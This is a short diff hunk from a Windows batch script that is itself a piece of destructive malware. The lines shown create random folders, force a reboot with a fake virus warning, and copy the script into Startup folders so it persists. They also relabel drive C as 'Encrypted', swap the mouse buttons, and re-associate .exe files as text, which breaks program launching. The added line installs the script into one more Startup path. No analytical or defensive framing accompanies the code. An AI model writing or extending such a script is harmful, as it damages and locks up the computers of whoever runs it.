@@ -17,6 +17,7 @@ md %random% %random% %random% %random% %random%
 shutdown /r /t 200 /c "it software virus"​
 copy %0 "C:\Users\Public\Desktop"
 copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+copy %0 "C:\Documents and Settings\All Users\Windows\Start Menu\Programs\Startup"
 label C:Encrypted
 rundll32 user32, SwapMouseButton
 assoc .exe=.txt
